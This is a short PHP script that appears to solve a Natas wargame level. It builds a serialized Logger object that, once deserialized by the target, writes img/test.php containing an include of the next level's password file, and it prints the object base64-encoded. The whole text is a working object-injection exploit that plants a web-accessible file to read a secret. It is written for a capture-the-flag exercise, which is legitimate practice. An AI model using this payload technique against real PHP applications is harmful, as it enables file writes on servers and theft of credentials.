<?php

class Logger
{
	private $exitMsg = "<?php include('/etc/natas_webpass/natas27'); ?>";

	private $logFile = "img/test.php";
}


print base64_encode(serialize(new Logger));
